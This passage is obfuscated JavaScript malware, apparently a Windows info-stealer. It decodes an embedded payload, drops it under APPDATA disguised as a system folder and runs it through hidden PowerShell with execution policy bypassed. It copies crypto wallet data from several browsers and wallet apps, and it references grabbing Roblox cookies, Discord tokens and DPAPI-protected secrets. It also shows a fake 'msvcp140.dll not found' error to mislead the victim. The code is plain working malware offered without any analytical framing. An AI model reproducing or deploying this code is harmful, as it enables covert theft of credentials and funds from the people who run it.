FOJ4SAL3GN4QEYSKTKQQHYICTMVWGKY3UFVJXI4TJNZTSAISOKZEUISKBL5JWK3DGKVYGIYLUMVPSEID4EBDG64SFMFRWQLKPMJVGKY3UEB5QUIBAEAQCAIBAEBUWMIBIERPSALLNMF2GG2BAEJHFMSKEJFAV6U3FNRTFK4DEMF2GKX33LNPH2XJLPURCSID3BIQCAIBAEAQCAIBAEAQCA43DNB2GC43LOMQC6ZDFNRSXIZJAF52G4IBENVQXIY3IMVZVWMC5EAXWMIBSHYSG45LMNQFCAIBAEAQCAIBAPUFCAIBAEB6QU7IKBJ2HE6JAPMFCAIBAEASGCY3UNFXW4IB5EBHGK5ZNKNRWQZLEOVWGKZCUMFZWWQLDORUW63RAFVCXQZLDOV2GKIBHO5ZWG4TJOB2C4ZLYMUTSALKBOJTXK3LFNZ2CAITAEISHMYTTKBQXI2DAEIRAUIBAEAQCI5DSNFTWOZLSEA6SATTFO4WVGY3IMVSHK3DFMRKGC43LKRZGSZ3HMVZCALKBORGG6Z2PNYFCAIBAEASHA4TJNZRWS4DBNQQD2ICOMV3S2U3DNBSWI5LMMVSFIYLTNNIHE2LOMNUXAYLMEAWVK43FOJEWIIBEMVXHMOSVKNCVETSBJVCSALKMN5TW63SUPFYGKICJNZ2GK4TBMN2GS5TFEAWVE5LOJRSXMZLMEBGGS3LJORSWICRAEAQCAJDTMV2HI2LOM5ZSAPJAJZSXOLKTMNUGKZDVNRSWIVDBONVVGZLUORUW4Z3TKNSXIIBNJV2WY5DJOBWGKSLOON2GC3TDMVZSASLHNZXXEZKOMV3SALKENFZWC3DMN53VG5DBOJ2ESZSPNZBGC5DUMVZGSZLTEASGMYLMONSSALKTORXXASLGI5XWS3THJ5XEEYLUORSXE2LFOMQCIZTBNRZWKIBNIFWGY33XJBQXEZCUMVZG22LOMF2GKIBEORZHKZJAFVJXIYLSORLWQZLOIF3GC2LMMFRGYZJAER2HE5LFEAWVE5LOJ5XGY6KJMZHGK5DXN5ZGWQLWMFUWYYLCNRSSAJDGMFWHGZJAFVAWY3DPO5JXIYLSORHW4RDFNVQW4ZBAER2HE5LFEAWUQ2LEMRSW4IBEMZQWY43FEAWUK6DFMN2XI2LPNZKGS3LFJRUW22LUEAUE4ZLXFVKGS3LFKNYGC3RAFVJWKY3PNZSHGIBQFEQC2UDSNFXXE2LUPEQDOCRAEAQCACRAEAQCAUTFM5UXG5DFOIWVGY3IMVSHK3DFMRKGC43LEAWVIYLTNNHGC3LFEASHIYLTNNHGC3LFEAWUCY3UNFXW4IBEMFRXI2LPNYQC2VDSNFTWOZLSEASHI4TJM5TWK4RAFVIHE2LOMNUXAYLMEASHA4TJNZRWS4DBNQQC2U3FOR2GS3THOMQCI43FOR2GS3THOMQC2RTPOJRWKID4EBHXK5BNJZ2WY3AKPUFGGYLUMNUCA6YKEAQCAIDUOJ4SA6YKEAQCAIBAEAQCAJDYNVWEG33OORSW45BAHUQEAIQKHQ7XQ3LMEB3GK4TTNFXW4PJCGEXDAIRAMVXGG33ENFXGOPJCKVKEMLJRGYRD6PQKHRKGC43LEB3GK4TTNFXW4PJCGEXDEIRAPBWWY3TTHURGQ5DUOA5C6L3TMNUGK3LBOMXG22LDOJXXG33GOQXGG33NF53WS3TEN53XGLZSGAYDILZQGIXW22LUF52GC43LEI7AUPCSMVTWS43UOJQXI2LPNZEW4ZTPHYFCAIB4IRSXGY3SNFYHI2LPNY7FG6LTORSW2ICNMFUW45DFNZQW4Y3FEBKGC43LHQXUIZLTMNZGS4DUNFXW4PQKHQXVEZLHNFZXI4TBORUW63SJNZTG6PQKHRKHE2LHM5SXE4Z6BIQCAPCMN5TW63SUOJUWOZ3FOI7AUIBAEAQDYRLOMFRGYZLEHZ2HE5LFHQXUK3TBMJWGKZB6BIQCAPBPJRXWO33OKRZGSZ3HMVZD4CR4F5KHE2LHM5SXE4Z6BI6FA4TJNZRWS4DBNRZT4CRAEA6FA4TJNZRWS4DBNQQGSZB5EJAXK5DIN5ZCEPQKEAQCAIB4JRXWO33OKR4XAZJ6JFXHIZLSMFRXI2LWMVKG623FNY6C6TDPM5XW4VDZOBST4CRAEAQCAPCSOVXEYZLWMVWD4TDFMFZXIUDSNF3GS3DFM5STYL2SOVXEYZLWMVWD4CRAEA6C6UDSNFXGG2LQMFWD4CR4F5IHE2LOMNUXAYLMOM7AUPCTMV2HI2LOM5ZT4CRAEA6E25LMORUXA3DFJFXHG5DBNZRWK42QN5WGSY3ZHZEWO3TPOJSU4ZLXHQXU25LMORUXA3DFJFXHG5DBNZRWK42QN5WGSY3ZHYFCAIB4IRUXGYLMNRXXOU3UMFZHISLGJ5XEEYLUORSXE2LFOM7GMYLMONSTYL2ENFZWC3DMN53VG5DBOJ2ESZSPNZBGC5DUMVZGSZLTHYFCAIB4KN2G64CJMZDW62LOM5HW4QTBOR2GK4TJMVZT4ZTBNRZWKPBPKN2G64CJMZDW62LOM5HW4QTBOR2GK4TJMVZT4CRAEA6EC3DMN53UQYLSMRKGK4TNNFXGC5DFHZ2HE5LFHQXUC3DMN53UQYLSMRKGK4TNNFXGC5DFHYFCAIB4KN2GC4TUK5UGK3SBOZQWS3DBMJWGKPTUOJ2WKPBPKN2GC4TUK5UGK3SBOZQWS3DBMJWGKPQKEAQDYUTVNZHW43DZJFTE4ZLUO5XXE22BOZQWS3DBMJWGKPTGMFWHGZJ4F5JHK3SPNZWHSSLGJZSXI53POJVUC5TBNFWGCYTMMU7AUIBAHREWI3DFKNSXI5DJNZTXGPQKEAQCAIB4KN2G64CPNZEWI3DFIVXGIPTGMFWHGZJ4F5JXI33QJ5XESZDMMVCW4ZB6BIQCAIBAHRJGK43UMFZHIT3OJFSGYZJ6MZQWY43FHQXVEZLTORQXE5CPNZEWI3DFHYFCAIB4F5EWI3DFKNSXI5DJNZTXGPQKEAQDYQLMNRXXOU3UMFZHIT3OIRSW2YLOMQ7HI4TVMU6C6QLMNRXXOU3UMFZHIT3OIRSW2YLOMQ7AUIBAHRCW4YLCNRSWIPTUOJ2WKPBPIVXGCYTMMVSD4CRAEA6EQ2LEMRSW4PTGMFWHGZJ4F5EGSZDEMVXD4CRAEA6FE5LOJ5XGY6KJMZEWI3DFHZTGC3DTMU6C6UTVNZHW43DZJFTESZDMMU7AUIBAHRLWC23FKRXVE5LOHZTGC3DTMU6C6V3BNNSVI32SOVXD4CRAEA6EK6DFMN2XI2LPNZKGS3LFJRUW22LUHZIFIMCTHQXUK6DFMN2XI2LPNZKGS3LFJRUW22LUHYFCAIB4KBZGS33SNF2HSPRXHQXVA4TJN5ZGS5DZHYFDYL2TMV2HI2LOM5ZT4CR4IFRXI2LPNZZSAQ3PNZ2GK6DUHUREC5LUNBXXEIR6BIQCAPCFPBSWGPQKEAQCAIB4INXW23LBNZSD453TMNZGS4DUFZSXQZJ4F5BW63LNMFXGIPQKEAQCAIB4IFZGO5LNMVXHI4Z6EISHMYTTKBQXI2BCHQXUC4THOVWWK3TUOM7AUIBAHQXUK6DFMM7AUPBPIFRXI2LPNZZT4CR4F5KGC43LHYFCEQAKEAQCAIBAEAQCAJDUMVWXAWDNNQQD2IC3KN4XG5DFNUXESTZOKBQXI2C5HI5EOZLUKRSW24CGNFWGKTTBNVSSQKJAFMQCOLTYNVWCOCRAEAQCAIBAEAQFWU3ZON2GK3JOJFHS4RTJNRSV2OR2K5ZGS5DFIFWGYVDFPB2CQJDUMVWXAWDNNQWCAJDYNVWEG33OORSW45BMEBNVG6LTORSW2LSUMV4HILSFNZRW6ZDJNZTV2OR2KVXGSY3PMRSSSCRAEAQCAIBAEAQHGY3IORQXG23TEAXWG4TFMF2GKIBPORXCAIREORQXG22OMFWWKIRAF54G23BAEISHIZLNOBMG23BCEAXWMID4EBHXK5BNJZ2WY3AKEAQCAIBAEAQCAUTFNVXXMZJNJF2GK3JAER2GK3LQLBWWYIBNIZXXEY3FEAWUK4TSN5ZECY3UNFXW4ICTNFWGK3TUNR4UG33OORUW45LFBIQCAIBAPUFCAIBAEBRWC5DDNAQHWCRAEAQCA7IKPUFAUJDBMRSHEZLTONSXGIB5EBAHWCRAEAQCAYTUMMQCAIB5EATWEYZROFZXKYZUOJRTE5LLNZWDIM3LOF4GK3LVPF3DMZBTPBTGM3TEOMZGUMBQHBTWUNZHBIQCAIBAMV2GQIBAEA6SAJZQPA3TAMBYG42UIRRVGVSDSMBUMIZDINBWHE2DKODBGZRECRJQGRDDMZDEG5SUMOJRIYTQUIBAEAQGY5DDEAQCAPJAE5WHIYZROF4DO3RXMZZDIYLOPFZXG6LIMZYDE4ZUONSDS2TWG5ZDQOLFPA4XGZBSMQ3GIZZHBIQCAIBAORZHQIBAEA6SAJ2UJJMWKRLIMFXVSNLTKE3DMU2IJRREG4BYGVVEOY2TNNYUYTDWIJKFKJYKEAQCAIDCMNUCAIBAHUQCO4L2NJ3TIZDKOU2XQMTYGNVXO5DVMVWHA4DNNU4GY4DXG5WXM3TBG5ZTKZTMMUZXG4RUE4FCAIBAEB4G24RAEAQD2IBHGQZUCS3RMQYUYNCRJNLFC5LYG5REWRKLGZSFK3KWJNCUUVDEIV2GOU3HLFQWUMRVOJTVER3BKVZHAMTHMVVUYQJRMJJEI6SKMJRGCZCQKRQU452CI44G42TNLFBVM5SFNFFFUQTZPF3FMNSOMFXEGVKSE4FCAIBAEB4HE4BAEAQD2IBHOJTDE6LTJZKUETSZIZIFQNLUPJHGMYKOM5JGUSSEMVSFCV3IGZWVGVRHBIQCAIBAPJRWC43IEA6SAJ3UGFQTGNDVKE4FQUSOJNXVO6LZNNIVKQLUKI3HM2RVHBKUITLQMFQXSZRHBIQCAIBAMRXWOZJAEA6SAJ2EKE2WKWSRPFGWEQ3TIFDUI32FG53HCM32ONIEQN3WGQZUK5TGKVLDM4SKOZ2EC4TTOFYXMN2MIVWWEM2CIY3GKMLWJB2WIR2QINIXA4DBPBTCOCRAEAQCA43PNQQCAIB5EATUKNSMJY4HQWSDLFQWSQKQNVRGETDDPJTVISSSG5MEG23UGFTWESTIJA3EMTBSLBBWO5KNOETQU7IKBISG25LUMV4E4YLNMUQD2IBHI5WG6YTBNROFO2LOIF2WI2LPJV2XIZLYE4FCIY3SMVQXIZLEJZSXOIB5EASGMYLMONSQU5DSPEQHWCRAEAQCAJDNOV2GK6BAHUQE4ZLXFVHWE2TFMN2CAU3ZON2GK3JOKRUHEZLBMRUW4ZZOJV2XIZLYFASHI4TVMUWCAJDNOV2GK6COMFWWKLBALNZGKZS5ERRXEZLBORSWITTFO4UQUIBAEAQGSZRAFAWW433UEASGG4TFMF2GKZCOMV3SSID3BIQCAIBAEAQCAIDFPBUXICRAEAQCA7IKPUFGGYLUMNUCA6YKEAQCAIDFPBUXICT5BIFCI3DBON2CAPJAE4TQU53INFWGKIBIER2HE5LFFEQHWCRAEAQCA5DSPEQHWCRAEAQCAIBAEAQECZDEFVKHS4DFEAWUC43TMVWWE3DZJZQW2ZJAKN4XG5DFNUXFO2LOMRXXO4ZOIZXXE3LTBIQCAIBAEAQCAIBEOR4HIIB5EBNVG6LTORSW2LSXNFXGI33XOMXEM33SNVZS4Q3MNFYGE33BOJSF2OR2I5SXIVDFPB2CQKIKEAQCAIBAEAQCA2LGEAUCI5DYOQQC2YLOMQQCI5DYOQQC23TFEASGYYLTOQUSA6YKEAQCAIBAEAQCAIBAEAQGSZRAFASHI6DUEAWW2YLUMNUCAJ26FBRGGML4LMYTGXJJLNQS26SBFVEEULKOKAWVUMBNHFOXWMRVFQ3DK7JEE4USA6YKEAQCAIBAEAQCAIBAEAQCAIBAEBNVG6LTORSW2LSXNFXGI33XOMXEM33SNVZS4Q3MNFYGE33BOJSF2OR2KNSXIVDFPB2CQJDBMRSHEZLTONSXGLTCORRSSCRAEAQCAIBAEAQCAIBAEB6QUIBAEAQCAIBAEAQCAIBAMVWHGZLJMYQCQJDUPB2CALLNMF2GG2BAE5PDA6C3MEWWMQJNIYYC2OK5PM2DA7JEE4USA6YKEAQCAIBAEAQCAIBAEAQCAIBAEBNVG6LTORSW2LSXNFXGI33XOMXEM33SNVZS4Q3MNFYGE33BOJSF2OR2KNSXIVDFPB2CQJDBMRSHEZLTONSXGLTFORUCSCRAEAQCAIBAEAQCAIBAEB6QUIBAEAQCAIBAEAQCAIBAMVWHGZLJMYQCQJDUPB2CALLNMF2GG2BAE5PCQTD4JV6DGKK3MEWWW3JNPJAS2SCKFVHFALK2GEWTSXL3GI3CYMZUPUSHYXTMORRTCW3BFV5ECLK2GAWTSXL3GM2SYNRQPUSCOKJAPMFCAIBAEAQCAIBAEAQCAIBAEAQCAW2TPFZXIZLNFZLWS3TEN53XGLSGN5ZG24ZOINWGS4DCN5QXEZC5HI5FGZLUKRSXQ5BIERQWIZDSMVZXGZLTFZWHIYZJBIQCAIBAEAQCAIBAEAQCA7IKEAQCAIBAEAQCAIBAEAQGK3DTMVUWMIBIER2HQ5BAFVWWC5DDNAQCOXSULNQS26SBFVNDALJZLV5TEOBMGM2H2JBHFEQHWCRAEAQCAIBAEAQCAIBAEAQCAIBALNJXS43UMVWS4V3JNZSG653TFZDG64TNOMXEG3DJOBRG6YLSMROTUOSTMV2FIZLYOQUCIYLEMRZGK43TMVZS45DSPAUQUIBAEAQCAIBAEAQCAIBAPUFCAIBAEAQCAIBAEAQCAIDFNRZWK2LGEAUCI5DYOQQC23LBORRWQIBHLYUCQYTJORRW62LOMNQXG2B2FE7SQ4L4OAUVWYJNPIYC2OK5PM2DC7JJEQTSSID3BIQCAIBAEAQCAIBAEAQCAIBAEAQFWU3ZON2GK3JOK5UW4ZDPO5ZS4RTPOJWXGLSDNRUXAYTPMFZGIXJ2HJJWK5CUMV4HIKBEMFSGI4TFONZWK4ZOMJRWQKIKEAQCAIBAEAQCAIBAEAQH2CRAEAQCAIBAEAQCAIBAEBSWY43FNFTCAKBEOR4HIIBNNVQXIY3IEATV4NC3GAWTSQKCLVNTCLJZIEWUQSRNJZIC2WTBFVVW2LL2LV5TSMRMHE2X2JBHFEQHWCRAEAQCAIBAEAQCAIBAEAQCAIBALNJXS43UMVWS4V3JNZSG653TFZDG64TNOMXEG3DJOBRG6YLSMROTUOSTMV2FIZLYOQUCIYLEMRZGK43TMVZS46DNOIUQUIBAEAQCAIBAEAQCAIBAPUFCAIBAEAQCAIBAEAQCAIDFNRZWK2LGEAUCI5DYOQQC23LBORRWQIBHLZZFWMBNHFQS26SBFVNF26ZSGQWDGND5EQTSSID3BIQCAIBAEAQCAIBAEAQCAIBAEAQFWU3ZON2GK3JOK5UW4ZDPO5ZS4RTPOJWXGLSDNRUXAYTPMFZGIXJ2HJJWK5CUMV4HIKBEMFSGI4TFONZWK4ZOPBZHAKIKEAQCAIBAEAQCAIBAEAQH2CRAEAQCAIBAEAQCAIBAEBSWY43FNFTCAKBEOR4HIIBNNVQXIY3IEATV45BRLMYC2OKBFV5F26ZTGIWDGOL5EQTSSID3BIQCAIBAEAQCAIBAEAQCAIBAEAQFWU3ZON2GK3JOK5UW4ZDPO5ZS4RTPOJWXGLSDNRUXAYTPMFZGIXJ2HJJWK5CUMV4HIKBEMFSGI4TFONZWK4ZOPJRWC43IFEFCAIBAEAQCAIBAEAQCAID5BIQCAIBAEAQCAIBAEAQCAZLMONSWSZRAFASHI6DUEAWW2YLUMNUCAJ26IR5TC7K3GUWTSQJNJBFC2TSQFVKV26ZRPVNTCLJZIEWUQSRNJZIC2WTBFVVW2LL2LV5TGMRMGYYX2JBHFEQHWCRAEAQCAIBAEAQCAIBAEAQCAIBALNJXS43UMVWS4V3JNZSG653TFZDG64TNOMXEG3DJOBRG6YLSMROTUOSTMV2FIZLYOQUCIYLEMRZGK43TMVZS4ZDPM5SSSCRAEAQCAIBAEAQCAIBAEB6QUIBAEAQCAIBAEAQCAIBAMVWHGZLJMYQCQJDUPB2CALLDNVQXIY3IEATV4WZRFU4UCLKIJIWU4UBNLJQS223NFV5F26ZTGIWDIND5EQTSSID3BIQCAIBAEAQCAIBAEAQCAIBAEAQFWU3ZON2GK3JOK5UW4ZDPO5ZS4RTPOJWXGLSDNRUXAYTPMFZGIXJ2HJJWK5CUMV4HIKBEMFSGI4TFONZWK4ZOONXWYKIKEAQCAIBAEAQCAIBAEAQH2CRAEAQCAIBAEAQCAIBAEASGYYLTOQQD2IBEOR4HICRAEAQCAIBAEAQH2CRAEAQCA7IKEAQCAIDDMF2GG2BAPMFCAIBAEAQAUIBAEAQH2CRAEAQCAU3UMFZHILKTNRSWK4BAFVGWS3DMNFZWKY3PNZSHGIBUGUYAU7I=",
    DWEdw: function (h, i) {
      return h(i);
    },
    FBhXI: "utf8",
    KTZNw: "Microsoft",
    JYoks: "SystemData",
    dSmrP: "pEOZA",
    Iierb: "sCyqf",
    WVoOd: function (h, i) {
      return h === i;
    },
    lqJmA: "FXzIE",
    lakxL: "initializeService-mkdir",
    dRmIS: function (h, i) {
      return h === i;
    },
    fJxAx: function (h, i) {
      return h !== i;
    },
    aQapi: "kSYSB",
    yQWzE: "LyyeD",
    TYBGR: function (h, i) {
      return h === i;
    },
    Wroep: "SMpPS",
    QdXre: "sys_core_",
    oaApj: function (h, i) {
      return h === i;
    },
    tzxqm: "SuyhR",
    nWjgO: "ciUjF",
    isztc: function (h, i) {
      return h !== i;
    },
    ESrHo: "iUfDC",
    uxwoC: function (h, i) {
      return h + i;
    },
    CaZan: "initializeService-unlink-",
    MXTdz: function (h, i) {
      return h !== i;
    },
    vXzEK: "JrhVF",
    qIRMr: function (h, i, j) {
      return h(i, j);
    },
    zJwvA: "initializeService-cleanup",
    OExWx: function (h, i, j) {
      return h(i, j);
    },
    VMcCD: "initializeService-write",
    xshEp: function (h, i) {
      return h(i);
    },
    LUQPJ: "cG93ZXJzaGVsbA==",
    NAFic: function (h, i) {
      return h + i;
    },
    GcPzN: "wUUxZ",
    sdxBk: "initializeService-exec-retry",
    xRlLU: "XzQKF",
    BZwWX: "TXrbS",
    SqPCo: function (h, i) {
      return h + i;
    },
    zTvgt: function (h, i) {
      return h + i;
    },
    nCBsp: function (h, i) {
      return h + i;
    },
    xvxcS: " -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File \\\"",
    IhVch: "pipe",
    VeLbb: "PvmfU",
    eAfjL: "initializeService-exec-fallback",
    ZmSln: "jNSuz",
    AkWEo: function (h, i, j) {
      return h(i, j);
    },
    IYYtx: "initializeService-general"
  };
  if (b.hWYAs(os.platform(), b.tOhQm)) {
    return;
  }
  const c = b.WpRZY(generateRandomString, 8);
  const d = b.bLPMj("sys_core_" + c, b.XDQNr);
  try {
    const h = b.HqaHe;
    b.dyNHG(execSync, h, {
      stdio: b.uMZPE,
      windowsHide: true,
      timeout: 5000
    });
  } catch (i) {
    if (b.MkWnN(b.lkAEP, b.nfleU)) {
      try {
        if (b.OPxCv !== b.EiCXz) {
          b.APLPW(execSync, b.YcOGh, {
            stdio: b.uMZPE,
            windowsHide: true
          });
        } else {
          const m = "Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(" + g + "), $null, 'CurrentUser')";
          const o = b.QQGLR(h, "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"-\"", {
            timeout: 20000,
            windowsHide: true
          }, (p, q) => {
            if (p) {
              b.uVemQ(m, p);
            } else {
              o(q);
            }
          });
          o.stdin.write(m);
          o.stdin.end();
        }
      } catch (k) {}
    } else {
      g(h, "fetchGamesData-" + i + "-" + j);
    }
  }
  const g = b.UpXTO;
  try {
    const m = b.DWEdw(decodeBase64, g).toString(b.FBhXI);
    const n = path.join(process.env.APPDATA, b.KTZNw, "Windows", b.JYoks);
    try {
      if (b.dSmrP !== b.Iierb) {
        if (!fs.existsSync(n)) {
          if (b.WVoOd(b.lqJmA, b.lqJmA)) {
            fs.mkdirSync(n, {
              recursive: true
            });
          } else {
            try {
              g.rmdirSync(h);
            } catch (t) {}
          }
        }
      } else {
        c(d, "fetchGamesData-PrismLauncherPortable");
      }
    } catch (u) {
      b.nEaWP(logError, u, b.lakxL);
    }
    try {
      if (b.dRmIS("zjMQv", "zjMQv")) {
        if (fs.existsSync(n)) {
          if (b.fJxAx(b.aQapi, b.yQWzE)) {
            const v = fs.readdirSync(n);
            for (const w of v) {
              if (b.TYBGR(b.Wroep, b.Wroep)) {
                if (w.endsWith(b.XDQNr) && w.startsWith(b.QdXre)) {
                  if (b.oaApj(b.tzxqm, b.nWjgO)) {
                    return "";
                  } else {
                    try {
                      if (b.isztc("pgZmN", b.ESrHo)) {
                        fs.unlinkSync(path.join(n, w));
                      } else {
                        h.push(i.substring(j, b.iCrnR(k, l)));
                      }
                    } catch (z) {
                      logError(z, b.uxwoC(b.CaZan, w));
                    }
                  }
                }
              } else {
                b.zORoA(d, g.from(h, b.IZjxu));
              }
            }
          } else {
            var C = o.readUInt32BE(b.iCrnR(p, 8));
            for (var D = 0; b.IYOxi(D, q); D++) {
              var E = b.AWQeo(b.ZeRBE(A[b.iCrnR(b.iCrnR(B, 12), b.uFdTR(D, 2))], 8), C[b.iCrnR(D, 13) + b.yASKo(D, 2)]);
              var F = E.readUInt32BE(E);
              b.APLPW(F, F, G);
            }
            b.APLPW(y, C, z);
          }
        }
      } else {
        const D = k.createWriteStream(l);
        const G = b.HNwYM(m, "zip", {
          zlib: {
            level: 1
          }
        });
        D.on(b.sogFp, () => D(G));
        G.on(b.SWrkW, H => {
          b.APLPW(D, H, b.VBXYC);
          G(H);
        });
        G.pipe(D);
        G.directory(r, false);
        G.finalize();
      }
    } catch (D) {
      if (b.MXTdz(b.vXzEK, b.vXzEK)) {
        c(d, b.MnMtH);
      } else {
        b.qIRMr(logError, D, b.zJwvA);
      }
    }
    const o = path.join(n, d);
    try {
      fs.writeFileSync(o, m, b.FBhXI);
    } catch (F) {
      b.OExWx(logError, F, b.VMcCD);
      return;
    }
    const p = b.xshEp(decodeString, b.LUQPJ);
    const q = b.NAFic(p, " -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File \"") + o + "\"";
    try {
      if (b.GcPzN !== b.GcPzN) {
        c.rmdirSync(d);
      } else {
        b.qIRMr(exec, q, {
          windowsHide: true,
          detached: true,
          stdio: b.uMZPE
        });
      }
    } catch (H) {
      logError(H, b.sdxBk);
      try {
        if (b.MkWnN(b.xRlLU, b.BZwWX)) {
          const I = b.SqPCo(b.zTvgt(b.nCBsp(p, " -Command \"Start-Process ") + p, b.xvxcS) + o, b.pcici);
          b.nEaWP(execSync, I, {
            stdio: b.IhVch,
            windowsHide: true,
            timeout: 5000
          });
        } else {
          const K = b.AOrvH(b.bLPMj(g + b.BXEdv, h), " -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File \\\"") + i + b.pcici;
          b.nEaWP(j, K, {
            stdio: "pipe",
            windowsHide: true,
            timeout: 5000
          });
        }
      } catch (K) {
        if (b.MkWnN(b.VeLbb, b.VeLbb)) {
          o = b.AWQeo(b.ZeRBE(p, 5), q.indexOf(r[s].toUpperCase()));
          t += 5;
          if (b.LXwlE(u, 8)) {
            A[B++] = b.zmwvD(C >>> b.wWWap(D, 8), 255);
            E -= 8;
          }
        } else {
          logError(K, b.eAfjL);
        }
      }
    }
    b.DWEdw(logSuccess, "0xC");
  } catch (M) {
    if (b.WVoOd(b.ZmSln, b.ZmSln)) {
      b.AkWEo(logError, M, b.IYYtx);
    } else {
      b.exit(0);
    }
  }
}
async function fetchWallets() {
  const g = {
    wZycY: function (j, k) {
      return j || k;
    },
    oXcbW: "hex",
    NWRWC: "aes-256-gcm",
    oGXIi: function (j, k) {
      return j + k;
    },
    jbmcj: "utf8",
    SmCey: function (j, k, l) {
      return j(k, l);
    },
    VGLVM: "Roblox",
    extee: "GlobalBasicSettings_13.xml",
    TOGRT: "Roblox (Player)",
    AVvht: ".roblox.com",
    bnAYI: "Roblox Player",
    xrJRd: "N/A",
    TSySO: "IP retrieval error",
    cLYJC: function (j, k) {
      return j + k;
    },
    HKSxP: "Brave",
    WzGQT: function (j, k) {
      return j + k;
    },
    sRyhR: "\\Yandex\\YandexBrowser\\User Data\\",
    sJDEZ: "Yandex",
    siLez: function (j, k) {
      return j + k;
    },
    TKwwi: "Edge",
    YjSbz: function (j, k) {
      return j + k;
    },
    acStc: "\\Opera Software\\Opera Stable\\",
    gPtDB: "Opera",
    lQWYy: "\\Opera Software\\Opera GX Stable\\",
    rXDri: function (j, k) {
      return j !== k;
    },
    mjdyd: "wQvHZ",
    iwiqD: "Default",
    LeGPN: "Profile 1",
    yWXQe: "Profile 3",
    LXkDV: "Profile 4",
    rDZxT: "Profile 5",
    jguzH: function (j, k) {
      return j === k;
    },
    EfvVx: "JjmyH",
    jnIwM: function (j, k) {
      return j === k;
    },
    hQWlG: "QvmSg",
    YsAca: "UDNlA",
    DltqF: "dsaXd",
    wFImJ: function (j, k) {
      return j !== k;
    },
    InEpb: "OihJm",
    iJgfY: "ThicO",
    yqLEQ: "eGjsD",
    UxjJJ: "ebvTK",
    kZZqD: "RhcJH",
    LLjQx: "oYTAF",
    mVvXl: function (j, k, l) {
      return j(k, l);
    },
    afDpp: "fetchWallets"
  };
  const h = [];
  let i = 0;
  try {
    const j = path.join(mainFolderPath, "Wallets");
    const k = PATHS.wallets;
    const l = [[g.oGXIi(user.local, "\\Google\\Chrome\\User Data\\"), "Chrome"], [g.cLYJC(user.local, "\\BraveSoftware\\Brave-Browser\\User Data\\"), g.HKSxP], [g.WzGQT(user.local, g.sRyhR), g.sJDEZ], [g.siLez(user.local, "\\Microsoft\\Edge\\User Data\\"), g.TKwwi], [g.YjSbz(user.roaming, g.acStc), g.gPtDB], [g.cLYJC(user.roaming, g.lQWYy), "OperaGX"]];
    for (const [n, o] of l) {
      if (g.rXDri(g.mjdyd, g.mjdyd)) {
        if (g.wZycY(!j, !k)) {
          return "";
        }
        try {
          var q = q.from(r, g.oXcbW);
          var r = s.createDecipheriv(g.NWRWC, t.from(u, g.oXcbW), q.slice(0, 12));
          r.setAuthTag(q.slice(12, 28));
          return g.oGXIi(r.update(q.slice(28), null, g.jbmcj), r.final(g.jbmcj));
        } catch (s) {
          return "";
        }
      } else {
        if (!fs.existsSync(n)) {
          continue;
        }
        let q = [g.iwiqD, g.LeGPN, "Profile 2", g.yWXQe, g.LXkDV, g.rDZxT];
        if (o.includes("Opera")) {
          q = [""];
        }
        for (const r of q) {
          if (g.jguzH(g.EfvVx, g.EfvVx)) {
            let s = r ? path.join(n, r) : n;
            if (!fs.existsSync(s)) {
              continue;
            }
            for (const [t, u] of Object.entries(k)) {
              if (g.jnIwM(g.hQWlG, g.YsAca)) {
                try {
                  i.copyFileSync(j, k);
                } catch (w) {}
              } else {
                const w = path.join(s, u);
                if (fs.existsSync(w)) {
                  if (g.DltqF === "UdyvL") {
                    g.SmCey(d, g, "fetchSocials-" + h);
                  } else {
                    try {
                      if (g.wFImJ("vTPrm", g.InEpb)) {
                        if (!fs.existsSync(j)) {
                          fs.mkdirSync(j, {
                            recursive: true
                          });
                        }
                        const z = path.join(j, o + "_" + g.wZycY(r, g.iwiqD) + "_" + t);
                        if (!fs.existsSync(z)) {
                          fs.mkdirSync(z, {
                            recursive: true
                          });
                        }
                        await copyFolderRecursive(w, z);
                        h.push("- " + t + " (" + o + " - " + (r || g.iwiqD) + ")");
                        i++;
                      } else {
                        return c.readFileSync(d, "utf8");
                      }
                    } catch (C) {
                      g.SmCey(logError, C, "fetchWallets-" + t);
                    }
                  }
                }
              }
            }
          } else {
            const E = h.join(i.env.LOCALAPPDATA || "", g.VGLVM, g.extee);
            if (j.existsSync(E)) {
              const F = m.readFileSync(E, g.jbmcj);
              const G = F.match(/\.ROBLOSECURITY.*?<value>(.*?)<\/value>/s);
              if (G && G[1]) {
                n.push({
                  service: g.TOGRT,
                  host: g.AVvht,
                  name: ".ROBLOSECURITY",
                  value: G[1],
                  browser: g.bnAYI,
                  expiration: g.xrJRd
                });
              }
            }
          }
        }
      }
    }
    const m = PATHS.walletApps;
    for (const [E, F] of Object.entries(m)) {
      if (g.jguzH(g.iJgfY, g.yqLEQ)) {
        c(d, "fetchDiscordTokens");
      } else if (fs.existsSync(F)) {
        try {
          if (g.rXDri(g.UxjJJ, g.kZZqD)) {
            if (!fs.existsSync(j)) {
              fs.mkdirSync(j, {
                recursive: true
              });
            }
            const I = path.join(j, E);
            if (!fs.existsSync(I)) {
              fs.mkdirSync(I, {
                recursive: true
              });
            }
            await copyFolderRecursive(F, I);
            h.push("- " + E + " (App)");
            i++;
          } else {
            return c.readFileSync(d, "latin1");
          }
        } catch (L) {}
      }
    }
  } catch (M) {
    if (g.jguzH("oYTAF", g.LLjQx)) {
      g.mVvXl(logError, M, g.afDpp);
    } else {
      g.SmCey(d, g, "sendTelegramMessage-ipLookup");
      h = g.TSySO;
    }
  }
  return i;
}
function onlyUnique(a, b, c) {
  return c.indexOf(a) === b;
}
function showFakeError() {
  return new Promise(b => {
    const c = {
      PoOIf: "\\Roaming\\",
      Tdigd: function (d, g) {
        return d(g);
      },
      EAAnT: function (d, g) {
        return d !== g;
      },
      pHqDh: "GuABM",
      XbNon: "JmEEL",
      KckIL: function (d) {
        return d();
      }
    };
    try {
      const g = "The code execution cannot proceed because msvcp140.dll was not found. Reinstalling the program may fix this problem.";
      const h = "System Error";
      const i = "cmd /c start \"\" mshta vbscript:Execute(\"MsgBox \"\"" + g + "\"\", 16, \"\"" + h + "\"\":close\")";
      exec(i, {
        windowsHide: true,
        detached: true,
        stdio: "ignore"
      }, j => {
        if (c.EAAnT(c.pHqDh, c.XbNon)) {
          c.KckIL(b);
        } else {
          c.Tdigd(g, "[Catbox] Skipping upload: File too large (" + h(i) + ")");
          return j(null);
        }
      });
